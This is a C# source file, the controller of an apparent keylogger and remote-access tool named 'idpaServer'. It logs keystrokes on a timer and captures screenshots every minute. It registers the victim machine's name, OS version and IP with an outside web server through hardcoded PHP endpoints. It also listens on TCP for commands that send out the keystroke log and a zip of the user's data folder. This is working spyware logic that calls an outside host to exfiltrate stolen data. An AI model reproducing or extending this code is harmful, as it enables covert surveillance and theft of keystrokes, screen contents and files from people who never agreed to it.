using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace idpaServer
{
    static class Controller
    {
        //===Config===

        //Paths
        public const string APP_PATH = @"C:\Temp"; //Path where the Application saves Files
        public const string DATA_PATH = @"C:\Temp\User"; //Path where the User Data is stored -- C:\Users
        public const string KEYLOGFILE_NAME = @"\log.xml"; //The name of the LogFile
        public const string ZIPFILE_NAME = @"\userdata.zip"; //The name of the Zipped File
        public const string PRINTSCREEN_NAME = "PrintScreen"; //The name of the Print Screens
        public const string PRINTSCREEN_PATH = APP_PATH + @"\PrintScreens\"; //The Path where the Printscreens are stored
        public const string LOG_PATH = Controller.APP_PATH + Controller.KEYLOGFILE_NAME; //Where the logfile will be stored
        public const string ZIP_PATH = Controller.APP_PATH + Controller.ZIPFILE_NAME; //Where the logfile will be stored

        //API URLs
        public const string API_URI_SAVE_CLIENT_DATA = "http://www.swordbreacker.ch/idpa/index.php"; //URI for creating a new Entry in the Database for this PC
        public const string API_URI_CHANGE_IP = "http://www.swordbreacker.ch/idpa/getip.php"; //URI for check if IP has changed 
        public const string API_URI_UPDATE_IP = "http://www.swordbreacker.ch/idpa/updateip.php"; //URI for Update the Entry with the new IP

        //Timer
        public const int PRINT_SCREEN_INTERVAL = 60000; //Interval in which a Screenshot is taken -- Intervall in miliseconds 1000 = 1 sek default 60000
        public const int KEY_LOG_INTERVAL = 10; //Intervall in which keys will be stored in the Logger Object
        public const int KEY_LOGFILE_INTERVAL = 30000; //Intervall in which the log file will be updated

        //============

        //Variables
        public static string clientCommand;
        private static int printScreenCount;
        private static string myPcName;
        private static string myWinVers;
        private static int myServerID;
        private static string localIp = "127.0.0.1";
        private static string clientIp = "127.0.0.1";

        //Timers
        private static System.Timers.Timer timerPrintScreen;
        private static System.Timers.Timer timerKey;
        private static System.Timers.Timer timerKeyLogfile;

        public static int PrintScreenCount
        {
            set
            {
                Properties.Settings.Default.printScreenCount = value;
                Properties.Settings.Default.Save();
            }
            get
            {
                printScreenCount = Properties.Settings.Default.printScreenCount;
                return printScreenCount;
            }
        }

        public static void Init()
        {
            myServerID = Properties.Settings.Default.id;
            myPcName = System.Environment.MachineName;
            myWinVers = Environment.OSVersion.ToString();
            //localIp = ConnectionManager.GetLocalIp();

            //Ist these Pc in the Webserver Database when no create Entry
            if (myServerID == 0)
            {
                Console.WriteLine("Create Entry in the Database");
                myServerID = ConnectionManager.SaveClientDataToServer(API_URI_SAVE_CLIENT_DATA, myPcName, myWinVers);
                Properties.Settings.Default.id = myServerID;
                Properties.Settings.Default.Save();
                Console.WriteLine("Entry Created with the ID {0}", myServerID);
            }

            //Check if IP is up to Date when no Update Entry
            else if (ConnectionManager.HasClientIpChangend(API_URI_CHANGE_IP, myServerID))
            {
                Console.WriteLine("IP has changed Update Entry");
                Console.WriteLine(ConnectionManager.UpdateEntry(API_URI_UPDATE_IP, myServerID));
            }
              
            //Create Timers
            timerPrintScreen = new System.Timers.Timer(PRINT_SCREEN_INTERVAL);
            timerKey = new System.Timers.Timer(KEY_LOG_INTERVAL);
            timerKeyLogfile = new System.Timers.Timer(KEY_LOGFILE_INTERVAL);

            //Add the Events to the Timers
            //timerPrintScreen.Elapsed += new ElapsedEventHandler(PrintScreen.GetScreenshot);
            timerKey.Elapsed += new ElapsedEventHandler(Keylogger.KeyTick);
            timerKeyLogfile.Elapsed += new ElapsedEventHandler(InitSaveLogFile);
            timerPrintScreen.Elapsed += new ElapsedEventHandler(InitSavePrintScreen);

            //Enable the Timers
            timerPrintScreen.Enabled = true;
            timerKey.Enabled = true;
            timerKeyLogfile.Enabled = true;

            //use KeepAlive for long runnig Timers
            GC.KeepAlive(timerPrintScreen);
            GC.KeepAlive(timerKey);
            GC.KeepAlive(timerKeyLogfile);

            Console.WriteLine("Controller Initialized");

            //Initialize TCP Listener
            ConnectionManager.StartTCPListener();

            while (true)
            {
                if (clientCommand != null)
                    RunCommand();
            }
        }

        private static void RunCommand()
        {
            clientCommand = clientCommand.Trim().ToLower().Normalize();

            timerKey.Stop();
            timerKeyLogfile.Stop();
            timerPrintScreen.Stop();

            switch (clientCommand)
            {
                case "getlogfile":
                    ConnectionManager.SendFileToClient(clientIp, LOG_PATH);
                    break;
                case "getdata":
                    FileManager.ZipUserData(DATA_PATH, ZIP_PATH);
                    ConnectionManager.SendFileToClient(clientIp, ZIP_PATH);
                    break;
                case "ping":
                    Console.WriteLine("Pong");
                    break;
                default:
                    Console.WriteLine("I don't know this Command: {0}", clientCommand);
                    break;
            }

            timerKey.Start();
            timerKeyLogfile.Start();
            timerPrintScreen.Start();

            clientCommand = null;
        }

        private static void InitSavePrintScreen(object sender, EventArgs e)
        {
            Console.WriteLine("Printscreen taken");
            FileManager.SavePrintScreen(PrintScreen.GetScreenshot(), PRINTSCREEN_PATH, PRINTSCREEN_NAME);
        }

        private static void InitSaveLogFile(object sender, EventArgs e)
        {
            Console.WriteLine("Logfile written");
            FileManager.SaveLogFile(LOG_PATH, Keylogger.GetLogger());
        }
    }
}